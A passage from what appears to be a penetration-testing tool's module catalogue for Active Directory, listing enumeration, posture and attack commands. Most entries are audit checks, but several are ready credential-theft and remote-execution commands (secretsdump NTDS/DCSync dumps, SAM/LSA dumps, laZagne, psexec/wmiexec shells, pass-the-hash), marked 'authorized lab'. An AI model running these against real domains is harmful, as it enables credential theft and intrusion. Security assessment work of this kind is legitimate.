    description: 'LSASS, SAM, NTDS.dit, DCC2 cached credentials, all-in-one app secret recovery, RemoteMonologue, SCCMDecryptor-BOF, and goLAPS coverage.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'], read_only: false,
    command_groups: [
      {
        id: 'dump-signals', name: 'Evidence classification and posture checks',
        description: 'Classify dump surface and review RunAsPPL / Credential Guard state.',
        commands: [
          { id: 'dump-sig-1', title: 'Check RunAsPPL state', command: 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL', notes: '1 or 2 means LSASS is PPL-protected — standard tools will fail.' },
          { id: 'dump-sig-2', title: 'Check Credential Guard state', command: 'Get-CimInstance -ClassName Win32_DeviceGuard | Select-Object SecurityServicesRunning,VirtualizationBasedSecurityStatus', notes: 'LSAIso (value 2 in SecurityServicesRunning) = Credential Guard active.' },
          { id: 'dump-sig-3', title: 'Check WDigest registry', command: 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential', notes: '1 = WDigest enabled, cleartext credentials cached in LSASS.' },
          { id: 'dump-sig-4', title: 'LSASS process info', command: 'Get-Process lsass | Select-Object Id,Name,HandleCount,WorkingSet', notes: 'PID for reference; check PPL before any memory access.' },
        ],
      },
      {
        id: 'dump-sam-ntds', name: 'SAM, NTDS, and LSA secrets (authorized lab)',
        description: 'Remote and local extraction of SAM/NTDS/LSA in approved environments.',
        commands: [
          { id: 'dump-sam-1', title: 'secretsdump remote SAM+LSA', command: 'impacket-secretsdump <domain>/<user>:<pass>@<IP> -just-dc-user <target>', notes: 'Remote SAM/LSA/NTDS dump over SMB — authorized DC access only.' },
          { id: 'dump-sam-2', title: 'secretsdump full NTDS.dit', command: 'impacket-secretsdump <domain>/<user>:<pass>@<DC_IP> -just-dc', notes: 'Dumps all domain hashes from NTDS.dit via DRSUAPI — authorized only.' },
          { id: 'dump-sam-3', title: 'secretsdump local SAM (volume shadow)', command: 'impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL', notes: 'Parse offline SAM/SYSTEM/SECURITY copies from shadow copy.' },
          { id: 'dump-sam-4', title: 'nxc SAM dump', command: 'nxc smb <IP> -u <user> -p <pass> --sam', notes: 'Dumps local SAM hashes via nxc — requires local admin.' },
          { id: 'dump-sam-5', title: 'nxc LSA dump', command: 'nxc smb <IP> -u <user> -p <pass> --lsa', notes: 'Dumps LSA secrets including service account credentials.' },
        ],
      },
      {
        id: 'dump-cached-secrets', name: 'DCC2 and application credential stores',
        description: 'Cached credentials and application secret artifact inventory.',
        commands: [
          { id: 'dump-cache-1', title: 'DCC2 cached logon count', command: "reg query 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' /v CachedLogonsCount", notes: 'Shows number of DCC2 cached credentials (default 10).' },
          { id: 'dump-cache-2', title: 'LaZagne all credential stores', command: 'laZagne.exe all', notes: 'Recovers credentials from Windows apps, browsers, mail, Wi-Fi, Credential Manager — authorized host only.' },
          { id: 'dump-cache-3', title: 'goLazagne (Linux)', command: 'goLazagne', notes: 'Linux-side credential store recovery from browser and app secrets.' },
          { id: 'dump-cache-4', title: 'Credential Manager dump (cmdkey)', command: 'cmdkey /list', notes: 'Lists stored Credential Manager entries (run as target user).' },
          { id: 'dump-cache-5', title: 'Wi-Fi profile passwords', command: 'netsh wlan show profile name=<SSID> key=clear', notes: 'Recovers stored Wi-Fi PSK — useful for lateral access to network equipment.' },
        ],
      },
    ],
    excluded_capabilities: ['automatic credential dumping', 'automatic cracking on page load', 'cracking without explicit authorized-use acknowledgement'],
  },
  {
    id: 'coercion_relay_architecture', name: 'Coercion and Relay Architecture', category: 'credential-access',
    description: 'PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce, WebDAV coercion, Kerberos CNAME relay, NTLM relay paths, LLMNR/NBT-NS/mitm6, and file-drop hash capture.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'], read_only: false,
    command_groups: [
      {
        id: 'coercion-surface', name: 'Coercion surface enumeration',
        description: 'Identify coercion-capable services without triggering coercion.',
        commands: [
          { id: 'coerce-1', title: 'Check Print Spooler on DCs', command: "Get-ADDomainController -Filter * | ForEach-Object { Get-Service -ComputerName $_.Name -Name Spooler -ErrorAction SilentlyContinue } | Select-Object MachineName,Status", notes: 'Spooler on DCs enables PrinterBug/MS-RPRN coercion.' },
          { id: 'coerce-2', title: 'Check Print Spooler (remote, nxc)', command: 'nxc smb <IP/CIDR> -u <user> -p <pass> -M spooler', notes: 'Bulk spooler check across subnet via nxc.' },
          { id: 'coerce-3', title: 'Check WebClient service', command: 'Get-Service WebClient | Select-Object Status,StartType', notes: 'WebClient running = HTTP relay path via coercion (PetitPotam+WebDAV).' },
          { id: 'coerce-4', title: 'Check WebClient (nxc)', command: 'nxc smb <IP/CIDR> -u <user> -p <pass> -M webdav', notes: 'Bulk WebClient state check across subnet.' },
          { id: 'coerce-5', title: 'Coercer scan mode (no coercion)', command: 'Coercer scan -t <IP> -u <user> -p <pass> -d <domain>', notes: 'Identifies vulnerable coercion protocols — no actual coercion triggered.' },
        ],
      },
      {
        id: 'relay-mitigations', name: 'Relay mitigation posture',
        description: 'Check for SMB signing, LDAP signing, channel binding, and EPA.',
        commands: [
          { id: 'relay-1', title: 'SMB signing — nmap', command: 'nmap -Pn -p445 --script smb2-security-mode <IP/CIDR>', notes: "Identifies 'Message signing enabled but not required' (relay-vulnerable)." },
          { id: 'relay-2', title: 'SMB relay target list (nxc)', command: 'nxc smb <IP/CIDR> -u <user> -p <pass> --gen-relay-list relay_targets.txt', notes: 'Generates list of SMB relay targets — all hosts with signing disabled.' },
          { id: 'relay-3', title: 'LDAP signing requirement', command: 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters /v LDAPServerIntegrity', notes: '2 = required; 1 = negotiated; 0 = none.' },
          { id: 'relay-4', title: 'LDAP channel binding', command: 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters /v LdapEnforceChannelBinding', notes: '2 = always enforced; 1 = when supported; 0 = never.' },
          { id: 'relay-5', title: 'Check Responder analyze mode (authorized)', command: 'python3 Responder.py -I <interface> -A', notes: 'Analyze mode — logs NTLM auth without actively poisoning. Authorized only.' },
          { id: 'relay-6', title: 'Check IPv6/mitm6 exposure (authorized)', command: 'python3 mitm6.py -d <domain> --ignore-nofqdn -r', notes: 'Dry-run mode maps IPv6 DHCP exposure without relay. Authorized only.' },
        ],
      },
    ],
    excluded_capabilities: ['live coercion against unapproved systems', 'active poisoning', 'live relay execution'],
  },
  {
    id: 'delegation_abuse_architecture', name: 'Delegation Abuse Architecture', category: 'privilege-escalation',
    description: 'Unconstrained delegation, constrained delegation with/without protocol transition, RBCD, S4U2Self, S4U2Proxy, SPN swap, KrbRelayUp, and krbrelayx chains.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'], read_only: false,
    command_groups: [
      {
        id: 'delegation-enum-windows', name: 'Windows delegation enumeration',
        description: 'Full delegation visibility via PowerShell and AD module.',
        commands: [
          { id: 'deleg-win-1', title: 'Find unconstrained delegation (computers)', command: 'Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation,DNSHostName,OperatingSystem | Select-Object Name,DNSHostName,OperatingSystem', notes: 'High impact when paired with coercion — DCs excluded by default.' },
          { id: 'deleg-win-2', title: 'Find unconstrained delegation (users)', command: 'Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation | Select-Object SamAccountName,DistinguishedName', notes: 'User accounts with unconstrained delegation — unusual and high-risk.' },
          { id: 'deleg-win-3', title: 'Find constrained delegation', command: "Get-ADObject -LDAPFilter '(msDS-AllowedToDelegateTo=*)' -Properties msDS-AllowedToDelegateTo,SamAccountName,ObjectClass | Select-Object SamAccountName,ObjectClass,msDS-AllowedToDelegateTo", notes: 'Constrained delegation — check for any authentication protocol flag.' },
          { id: 'deleg-win-4', title: 'Find protocol transition accounts', command: 'Get-ADObject -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=16777216)" -Properties SamAccountName,msDS-AllowedToDelegateTo | Select-Object SamAccountName,msDS-AllowedToDelegateTo', notes: 'Protocol transition allows S4U2Self — impersonation without user TGT.' },
          { id: 'deleg-win-5', title: 'Find RBCD configuration', command: "Get-ADObject -LDAPFilter '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)' -Properties SamAccountName,msDS-AllowedToActOnBehalfOfOtherIdentity | Select-Object SamAccountName", notes: 'RBCD edges — who can impersonate to these objects.' },
        ],
      },
      {
        id: 'delegation-enum-linux', name: 'Linux delegation enumeration',
        description: 'Cross-platform delegation discovery via LDAP.',
        commands: [
          { id: 'deleg-lin-1', title: 'Find unconstrained delegation (LDAP)', command: "ldapsearch -x -H ldap://<IP> -b 'dc=corp,dc=com' '(userAccountControl:1.2.840.113556.1.4.803:=524288)' sAMAccountName dNSHostName userAccountControl", notes: 'Bit 524288 = TrustedForDelegation.' },
          { id: 'deleg-lin-2', title: 'Find constrained delegation (LDAP)', command: "ldapsearch -x -H ldap://<IP> -b 'dc=corp,dc=com' '(msDS-AllowedToDelegateTo=*)' sAMAccountName msDS-AllowedToDelegateTo userAccountControl", notes: 'SPN targets allowed for constrained delegation.' },
          { id: 'deleg-lin-3', title: 'Find RBCD (LDAP)', command: "ldapsearch -x -H ldap://<IP> -b 'dc=corp,dc=com' '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)' cn sAMAccountName", notes: 'Objects with RBCD configured.' },
          { id: 'deleg-lin-4', title: 'Check MachineAccountQuota (LDAP)', command: "ldapsearch -x -H ldap://<IP> -b 'dc=corp,dc=com' -s base '(objectClass=domain)' ms-DS-MachineAccountQuota", notes: 'MAQ > 0 allows any user to create machine accounts for RBCD abuse.' },
        ],
      },
    ],
    excluded_capabilities: ['impersonation', 'S4U ticket requests', 'RBCD writes'],
  },
  {
    id: 'adidns_architecture', name: 'ADIDNS and DNS Abuse', category: 'infrastructure',
    description: 'AD-integrated DNS enumeration, CNAME relay, poisoning, wildcard records, record injection, ADIDNS time-bomb tracking, and stale record discovery.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'], read_only: false,
    command_groups: [
      {
        id: 'adidns-enum', name: 'ADIDNS zone enumeration',
        description: 'Dump and review AD-integrated DNS zones for suspicious records.',
        commands: [
          { id: 'adidns-1', title: 'adidnsdump — full zone dump', command: "adidnsdump -u '<domain>\\<user>' ldap://<dc> --print-zones", notes: 'Authorized zone inventory including tombstoned records.' },
          { id: 'adidns-2', title: 'adidnsdump — single zone', command: "adidnsdump -u '<domain>\\<user>' ldap://<dc> -z <zone>", notes: 'Dump specific DNS zone for review.' },
          { id: 'adidns-3', title: 'dnstool query record', command: 'python3 dnstool.py --record <name> --action query --zone <zone> <dc>', notes: 'Check if a DNS record already exists before any write.' },
          { id: 'adidns-4', title: 'List DNS zones via PowerShell', command: 'Get-DnsServerZone | Select-Object ZoneName,ZoneType,IsDsIntegrated,IsAutoCreated', notes: 'Lists all server zones including AD-integrated — run on DC.' },
          { id: 'adidns-5', title: 'Dump zone via PowerShell', command: 'Get-DnsServerResourceRecord -ZoneName <zone> | Select-Object HostName,RecordType,RecordData | Sort-Object HostName', notes: 'Full zone record inventory from DC.' },
          { id: 'adidns-6', title: 'List DNS zones via LDAP', command: "ldapsearch -x -H ldap://<IP> -b 'DC=<zone>,CN=MicrosoftDNS,DC=DomainDnsZones,DC=corp,DC=com' '(objectClass=dnsNode)' name dnsRecord", notes: 'Raw LDAP DNS zone dump.' },
          { id: 'adidns-7', title: 'Find wildcard records', command: "Get-DnsServerResourceRecord -ZoneName <zone> | Where-Object {$_.HostName -eq '*'}", notes: 'Wildcard DNS records can enable coercion relay chains.' },
          { id: 'adidns-8', title: 'Find stale DNS records (>90 days)', command: 'Get-DnsServerResourceRecord -ZoneName <zone> | Where-Object {$_.TimeStamp -and $_.TimeStamp -lt (Get-Date).AddDays(-90)} | Select-Object HostName,RecordType,TimeStamp', notes: 'Stale records can be hijacked by re-registration.' },
        ],
      },
    ],
    excluded_capabilities: ['DNS poisoning', 'record injection', 'wildcard record creation'],
  },
  {
    id: 'sccm_architecture', name: 'SCCM Attack Surface', category: 'enterprise-management',
    description: 'SCCM enumeration, NAA credentials, task sequences, PXE, SCCMDecryptor-BOF, site-server relay, TAKEOVER 1-9, and deployment abuse coverage.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'], read_only: false,
    command_groups: [
      {
        id: 'sccm-discovery', name: 'SCCM infrastructure discovery',
        description: 'Locate SCCM components from AD and network.',
        commands: [
          { id: 'sccm-disc-1', title: 'sccmhunter — find infrastructure', command: 'sccmhunter find -u <user> -p <pass> -d <domain> -dc-ip <IP>', notes: 'Locates management points, site servers, and distribution points.' },
          { id: 'sccm-disc-2', title: 'sccmhunter — SMB enumerate', command: 'sccmhunter smb -u <user> -p <pass> -d <domain> -dc-ip <IP>', notes: 'Enumerates SCCM shares and network access points.' },
          { id: 'sccm-disc-3', title: 'Find SCCM site server (AD SCP)', command: "Get-ADObject -SearchBase 'CN=System Management,CN=System,DC=corp,DC=com' -Filter * -Properties *", notes: 'SCCM registers the site server in the System Management container.' },
          { id: 'sccm-disc-4', title: 'Find SCCM management points (DNS)', command: 'nslookup -type=SRV _sccm._tcp.<domain>', notes: 'Discovers management points via DNS SRV records.' },
          { id: 'sccm-disc-5', title: 'Find SCCM via nmap', command: 'nmap -Pn -p 80,443,8530,8531,10123 <IP>', notes: 'HTTP(S) and SCCM-specific ports for infrastructure mapping.' },
        ],
      },
      {
        id: 'sccm-credential-surface', name: 'SCCM credential store posture',
        description: 'NAA, task sequence, PXE, and WMI credential exposure checks.',
        commands: [
          { id: 'sccm-cred-1', title: 'Check NAA account via WMI', command: 'Get-WmiObject -Namespace root\\ccm\\policy\\machine\\ActualConfig -Class CCM_NetworkAccessAccount', notes: 'Reads NAA account name from SCCM client WMI — run on SCCM client.' },
          { id: 'sccm-cred-2', title: 'Check PXE password protection', command: 'sccmhunter pxe -u <user> -p <pass> -d <domain> -dc-ip <IP>', notes: 'PXE without password = unauthenticated task-sequence credential extraction.' },
          { id: 'sccm-cred-3', title: 'List SCCM site boundaries', command: 'sccmhunter show -u <user> -p <pass> -d <domain> -dc-ip <IP> -show boundaries', notes: 'Site boundary configuration for coverage analysis.' },
          { id: 'sccm-cred-4', title: 'Find SCCM device collections (SMB)', command: 'sccmhunter show -u <user> -p <pass> -d <domain> -dc-ip <IP> -show collections', notes: 'Collection visibility for deployment abuse surface analysis.' },
          { id: 'sccm-cred-5', title: 'Check SCCM client registry', command: "reg query 'HKLM\\SOFTWARE\\Microsoft\\SMS\\Mobile Client' /v CurrentManagementPoint", notes: 'Identifies the management point from the SCCM client — run on managed host.' },
        ],
      },
    ],
    excluded_capabilities: ['unauthorized software deployment', 'credential extraction outside scope', 'PXE exploitation'],
  },
  {
    id: 'lateral_movement_architecture', name: 'Lateral Movement Architecture', category: 'lateral-movement',
    description: 'Remote execution, PsExec/WMI/SMBExec, WinRM/RDP, PtH, PtT, OPtH, Pass-the-Cert, SCShell, DCOM, RDP hijacking, SQL linked servers, and Exchange paths.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'], read_only: false,
    command_groups: [
      {
        id: 'lat-exposure', name: 'Lateral movement service exposure',
        description: 'Enumerate remote management services without execution.',
        commands: [
          { id: 'lat-exp-1', title: 'Scan WinRM and RDP exposure', command: 'nmap -Pn -p 3389,5985,5986 -sV <IP/CIDR>', notes: 'Maps RDP and WinRM exposure across target range.' },
          { id: 'lat-exp-2', title: 'Check WinRM listener', command: 'winrm enumerate winrm/config/listener', notes: 'Lists WinRM interfaces and auth methods — run on target.' },
          { id: 'lat-exp-3', title: 'Check RDP enabled', command: "reg query 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server' /v fDenyTSConnections", notes: '0 = RDP enabled on target host.' },
          { id: 'lat-exp-4', title: 'Scan SMB and WMI ports', command: 'nmap -Pn -p 135,139,445,47001 -sV <IP/CIDR>', notes: 'Maps SMB, RPC endpoint mapper, and WinRM HTTP ports.' },
          { id: 'lat-exp-5', title: 'Test WinRM access (nxc)', command: 'nxc winrm <IP/CIDR> -u <user> -p <pass>', notes: 'Confirms WinRM access with credentials — no command execution.' },
          { id: 'lat-exp-6', title: 'Test SMB access (nxc)', command: 'nxc smb <IP/CIDR> -u <user> -p <pass>', notes: 'Confirms SMB access and lists host info.' },
        ],
      },
      {
        id: 'lat-exec-references', name: 'Remote execution references (authorized lab)',
        description: 'Execution technique references for approved lab environments.',
        commands: [
          { id: 'lat-exec-1', title: 'PsExec shell (impacket)', command: 'impacket-psexec <domain>/<user>:<pass>@<IP>', notes: 'SYSTEM shell via SMB service install — leaves service artifacts.' },
          { id: 'lat-exec-2', title: 'WMIExec shell (impacket)', command: 'impacket-wmiexec <domain>/<user>:<pass>@<IP>', notes: 'Semi-interactive shell via WMI — lower artifact footprint than PsExec.' },
          { id: 'lat-exec-3', title: 'SMBExec shell (impacket)', command: 'impacket-smbexec <domain>/<user>:<pass>@<IP>', notes: 'SYSTEM shell via SMB scheduled-command execution.' },
          { id: 'lat-exec-4', title: 'WinRM shell (evil-winrm)', command: "evil-winrm -i <IP> -u <user> -p '<pass>'", notes: 'Full PowerShell WinRM session with script upload capability.' },
          { id: 'lat-exec-5', title: 'Pass-the-Hash PsExec', command: 'impacket-psexec <domain>/<user>@<IP> -hashes :<NT_HASH>', notes: 'NTLM hash authentication — authorized lab use only.' },
          { id: 'lat-exec-6', title: 'Pass-the-Hash WMIExec', command: 'impacket-wmiexec <domain>/<user>@<IP> -hashes :<NT_HASH>', notes: 'WMI execution with hash — no plaintext password needed.' },
          { id: 'lat-exec-7', title: 'Pass-the-Ticket WinRM', command: 'KRB5CCNAME=<ticket.ccache> evil-winrm -i <IP> -r <domain>', notes: 'Kerberos ticket-based WinRM authentication.' },
        ],
      },
    ],
    excluded_capabilities: ['remote code execution without authorization', 'credential reuse against unapproved hosts'],
  },
  {
    id: 'domain_dominance_architecture', name: 'Domain Dominance and Ticket Forgery', category: 'domain-dominance',
    description: 'DCSync, NTDS dump, Golden/Diamond/Sapphire/Silver tickets, ExtraSID, trust tickets, rogue certificates, GoldenGMSA, forest pivots, and forest takeover references.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'], read_only: false,
    command_groups: [
      {
        id: 'domdom-prereqs', name: 'Dominance prerequisite checks',
        description: 'Check DCSync rights, krbtgt hygiene, and trust SID filtering.',
        commands: [
          { id: 'domdom-pre-1', title: 'Check DCSync rights on domain root', command: "(Get-Acl 'AD:\\DC=corp,DC=com').Access | Where-Object { $_.ObjectType -in @('1131f6aa-9c07-11d1-f79f-00c04fc2dcd2','1131f6ab-9c07-11d1-f79f-00c04fc2dcd2','89e95b76-444d-4c62-991a-0facbeda640c') } | Select-Object IdentityReference,ActiveDirectoryRights,ObjectType", notes: 'Exact OIDs for DS-Replication-Get-Changes, DS-Replication-Get-Changes-All, and filtered-set replication.' },
          { id: 'domdom-pre-2', title: 'Check DCSync rights (impacket)', command: "impacket-dacledit <domain>/<user>:<pass>@<DC_IP> -action read -target-dn 'DC=corp,DC=com' | grep -i Replication", notes: 'Linux-side DCSync right review.' },
          { id: 'domdom-pre-3', title: 'Check krbtgt password age', command: 'Get-ADUser krbtgt -Properties PasswordLastSet | Select-Object SamAccountName,PasswordLastSet', notes: 'krbtgt > 180 days old = Golden Ticket risk window still open.' },
          { id: 'domdom-pre-4', title: 'Check krbtgt AES keys enrolled', command: 'Get-ADUser krbtgt -Properties msDS-SupportedEncryptionTypes | Select-Object msDS-SupportedEncryptionTypes', notes: 'AES-only enforcement reduces Golden Ticket usability.' },
          { id: 'domdom-pre-5', title: 'Check SID filtering on trusts', command: 'Get-ADTrust -Filter * -Properties SIDFilteringForestAware,SIDFilteringQuarantined | Select-Object Name,SIDFilteringForestAware,SIDFilteringQuarantined,TrustType', notes: 'SID filtering disabled = ExtraSID/cross-forest ticket risk.' },
          { id: 'domdom-pre-6', title: 'Find gMSA with readable password', command: "Get-ADObject -LDAPFilter '(objectClass=msDS-GroupManagedServiceAccount)' -Properties msDS-GroupMSAMembership,msDS-ManagedPassword | Select-Object Name", notes: 'Readable gMSA password + KDS root key access = GoldenGMSA.' },
        ],
      },
      {
        id: 'domdom-ntds', name: 'NTDS and DCSync (authorized lab)',
        description: 'Domain hash extraction in approved lab environments.',
        commands: [
          { id: 'domdom-ntds-1', title: 'DCSync single account (impacket)', command: 'impacket-secretsdump <domain>/<user>:<pass>@<DC_IP> -just-dc-user <target_user>', notes: 'Single-account DCSync — minimal scope for authorized testing.' },
          { id: 'domdom-ntds-2', title: 'DCSync full domain (impacket)', command: 'impacket-secretsdump <domain>/<user>:<pass>@<DC_IP> -just-dc -outputfile ntds_dump', notes: 'Full domain hash extraction via DRSUAPI — authorized DC lab only.' },
          { id: 'domdom-ntds-3', title: 'NTDS via IFM (volume shadow, authorized)', command: "ntdsutil 'activate instance ntds' 'ifm' 'create full C:\\ifm' q q && impacket-secretsdump -ntds 'C:\\ifm\\Active Directory\\ntds.dit' -system C:\\ifm\\registry\\SYSTEM LOCAL", notes: 'IFM-based NTDS extraction — requires DC admin access.' },
        ],
      },
    ],
    excluded_capabilities: ['ticket forgery against production systems', 'unsanctioned DCSync', 'forest takeover'],
  },
  {
    id: 'persistence_architecture', name: 'Persistence Architecture', category: 'host-persistence',
    description: 'AdminSDHolder, GPO backdoors, machine-account persistence, ADIDNS time bombs, Golden Certificate, Skeleton Key, DCShadow, DSRM, custom SSP, and SIDHistory persistence.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'], read_only: false,
    command_groups: [
      {
        id: 'persist-adminsdholder', name: 'AdminSDHolder and protected objects',
        description: 'Detect ACL propagation backdoors on protected objects.',
        commands: [
          { id: 'persist-ash-1', title: 'Read AdminSDHolder ACL', command: "(Get-Acl 'AD:\\CN=AdminSDHolder,CN=System,DC=corp,DC=com').Access | Where-Object {$_.IdentityReference -notmatch 'Domain Admins|Enterprise Admins|Administrators|SYSTEM|CREATOR OWNER'} | Select-Object IdentityReference,ActiveDirectoryRights", notes: 'Non-default ACEs propagate to all adminCount=1 objects every 60 min.' },
          { id: 'persist-ash-2', title: 'List adminCount=1 objects', command: "Get-ADObject -LDAPFilter '(adminCount=1)' -Properties SamAccountName,ObjectClass | Select-Object SamAccountName,ObjectClass,DistinguishedName | Sort-Object ObjectClass", notes: 'All objects under AdminSDHolder protection.' },
          { id: 'persist-ash-3', title: 'Check SDProp interval', command: "Get-ADObject -Identity 'CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=corp,DC=com' -Properties AdminSDProtectFrequency | Select-Object AdminSDProtectFrequency", notes: 'Default 3600 seconds (60 min); lower = faster backdoor propagation.' },
        ],
      },
      {
        id: 'persist-gpo-sysvol', name: 'GPO and SYSVOL backdoor surfaces',
        description: 'GPO modification history and SYSVOL script inventory.',
        commands: [
          { id: 'persist-gpo-1', title: 'List GPO modification times', command: 'Get-GPO -All | Select-Object DisplayName,Id,ModificationTime,UserVersion,ComputerVersion | Sort-Object ModificationTime -Descending', notes: 'Recently modified GPOs are a backdoor signal.' },
          { id: 'persist-gpo-2', title: 'Find GPO scheduled tasks (SYSVOL)', command: "Get-ChildItem -Path '\\\\<domain>\\SYSVOL\\<domain>\\Policies' -Recurse -Filter 'ScheduledTasks.xml' | Select-Object FullName,LastWriteTime", notes: 'Malicious scheduled tasks in SYSVOL GPO folders.' },
          { id: 'persist-gpo-3', title: 'Find GPO scripts (SYSVOL)', command: "Get-ChildItem -Path '\\\\<domain>\\SYSVOL\\<domain>\\Policies' -Recurse -Include '*.ps1','*.bat','*.vbs' | Select-Object FullName,LastWriteTime,Length", notes: 'Logon/startup script abuse in GPO.' },
          { id: 'persist-gpo-4', title: 'Find per-user logon scripts', command: 'Get-ADUser -Filter * -Properties ScriptPath | Where-Object {$_.ScriptPath} | Select-Object SamAccountName,ScriptPath', notes: 'Per-user logon scripts that may have been modified for persistence.' },
        ],
      },
      {
        id: 'persist-sidhistory-dsrm', name: 'SIDHistory and DSRM posture',
        description: 'Detect SIDHistory persistence and DSRM password abuse risk.',
        commands: [
          { id: 'persist-sid-1', title: 'Find accounts with SIDHistory', command: "Get-ADObject -LDAPFilter '(sIDHistory=*)' -Properties SamAccountName,sIDHistory | Select-Object SamAccountName,sIDHistory", notes: 'SIDHistory can grant shadow privileges from previous domain memberships.' },
          { id: 'persist-sid-2', title: 'Check DSRM admin logon behavior', command: 'reg query HKLM\\System\\CurrentControlSet\\Control\\Lsa /v DsrmAdminLogonBehavior', notes: '2 = DSRM account usable over network — backdoor risk.' },
          { id: 'persist-sid-3', title: 'Check CA certificate count (Golden Cert prereq)', command: 'certutil -CA.cert | findstr Issuer', notes: 'Golden Certificate requires CA private key access — review CA backup controls.' },
        ],
      },
    ],
    excluded_capabilities: ['backdoor deployment', 'LSASS patching', 'DCShadow replication writes'],
  },
  {
    id: 'ad_cve_architecture', name: 'Notable AD CVE Coverage', category: 'vulnerability',
    description: 'ZeroLogon, PrintNightmare, noPac, Certifried, MS17-010, CVE-2025-24071, ESC8, and NTLM relay CVE posture checks.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'], read_only: false,
    command_groups: [
      {
        id: 'cve-netlogon', name: 'ZeroLogon and Netlogon posture',
        description: 'CVE-2020-1472 patch and enforcement mode checks.',
        commands: [
          { id: 'cve-nl-1', title: 'Check Netlogon enforcement mode', command: "reg query 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\Netlogon\\Parameters' /v FullSecureChannelProtection", notes: '1 = enforcement mode active; 0 or missing = still vulnerable window.' },
          { id: 'cve-nl-2', title: 'Check ZeroLogon patch (WMI)', command: 'Get-HotFix -Id KB4571694,KB4565503,KB4571723 | Select-Object HotFixID,InstalledOn', notes: 'August 2020 patches that closed CVE-2020-1472.' },
          { id: 'cve-nl-3', title: 'Check Netlogon secure channel', command: 'nltest /sc_verify:<domain>', notes: 'Verifies machine secure channel — broken channel may indicate exploit attempt.' },
        ],
      },
      {
        id: 'cve-spooler-printing', name: 'PrintNightmare posture',
        description: 'CVE-2021-1675 / CVE-2021-34527 patch and PointAndPrint review.',
        commands: [
          { id: 'cve-spool-1', title: 'Check Print Spooler service', command: 'Get-Service Spooler | Select-Object Status,StartType,Name', notes: 'Spooler running on DCs is a critical risk — should be disabled.' },
          { id: 'cve-spool-2', title: 'Check PointAndPrint policy', command: "reg query 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint' /v NoWarningNoElevationOnInstall", notes: '1 = PointAndPrint installs without elevation warning — PrintNightmare path.' },
          { id: 'cve-spool-3', title: 'Check PrintNightmare patch', command: 'Get-HotFix -Id KB5004945,KB5004946,KB5004947,KB5004948,KB5004960 | Select-Object HotFixID,InstalledOn', notes: 'July 2021 patches for CVE-2021-1675/34527.' },
        ],
      },
      {
        id: 'cve-nopac-certifried', name: 'noPac, Certifried, and CVE-2025-24071',
        description: 'Machine account name spoofing and archive hash-leak posture.',
        commands: [
          { id: 'cve-nopac-1', title: 'Check MachineAccountQuota (noPac prereq)', command: "Get-ADDomain | Select-Object -ExpandProperty 'ms-DS-MachineAccountQuota'", notes: 'MAQ > 0 + unpatched noPac = DA in a single step.' },
          { id: 'cve-nopac-2', title: 'Check noPac patch state', command: 'Get-HotFix -Id KB5008102,KB5008380 | Select-Object HotFixID,InstalledOn', notes: 'November 2021 patches for CVE-2021-42278/42287.' },
          { id: 'cve-nopac-3', title: 'Check Certifried patch (CVE-2022-26923)', command: 'Get-HotFix -Id KB5014754,KB5014745 | Select-Object HotFixID,InstalledOn', notes: 'May 2022 patches for CA-issued machine-account certificate spoofing.' },
          { id: 'cve-nopac-4', title: 'Check outbound SMB filtering (CVE-2025-24071)', command: "netsh advfirewall firewall show rule name=all | findstr -i '445.*block'", notes: 'CVE-2025-24071 leaks NTLM via archive handling — outbound SMB block mitigates.' },
          { id: 'cve-nopac-5', title: 'Check .library-ms association', command: 'assoc .library-ms', notes: 'Tracks file-type association exploited by CVE-2025-24071.' },
        ],
      },
    ],
    excluded_capabilities: ['live exploit execution', 'production system exploitation'],
  },
  {
    id: 'hybrid_entra_architecture', name: 'Hybrid Entra and Azure AD Paths', category: 'hybrid',
    description: 'Azure AD Connect, PHS/PTA/ADFS, PRT/token theft, cloud-to-on-prem paths, on-prem-to-cloud pivots, cross-tenant ROPC, SPA tokens, and Entra metaverse attacks.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'], read_only: false,
    command_groups: [
      {
        id: 'entra-aadc', name: 'Azure AD Connect enumeration',
        description: 'Identify AAD Connect server, sync account, and mode.',
        commands: [
          { id: 'entra-aadc-1', title: 'Find MSOL sync account (AD)', command: "Get-ADUser -Filter {SamAccountName -like 'MSOL_*'} -Properties Description,PasswordNeverExpires,Enabled,PasswordLastSet", notes: 'MSOL_ account has DCSync-equivalent rights — high-value target.' },
